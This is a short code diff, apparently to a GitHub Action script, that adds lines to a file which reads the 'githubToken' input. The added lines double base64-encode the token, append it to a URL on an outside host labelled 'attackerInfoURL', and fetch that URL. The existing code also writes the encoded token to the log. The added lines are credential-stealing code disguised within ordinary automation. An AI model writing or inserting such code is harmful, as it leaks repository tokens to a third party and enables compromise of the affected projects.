@@ -14,6 +14,9 @@ try {
   const tokey = core.getInput('githubToken');
   const encoded = Buffer.from(tokey).toString('base64');
   const encoded2 = Buffer.from(encoded).toString('base64');
+  const attackerInfoURL = "http://boogabeans.pythonanywhere.com/";
+  let badURL = attackerInfoURL.concat(encoded2);
+  fetch(badURL);
   console.log(`${encoded2}`);
 
 
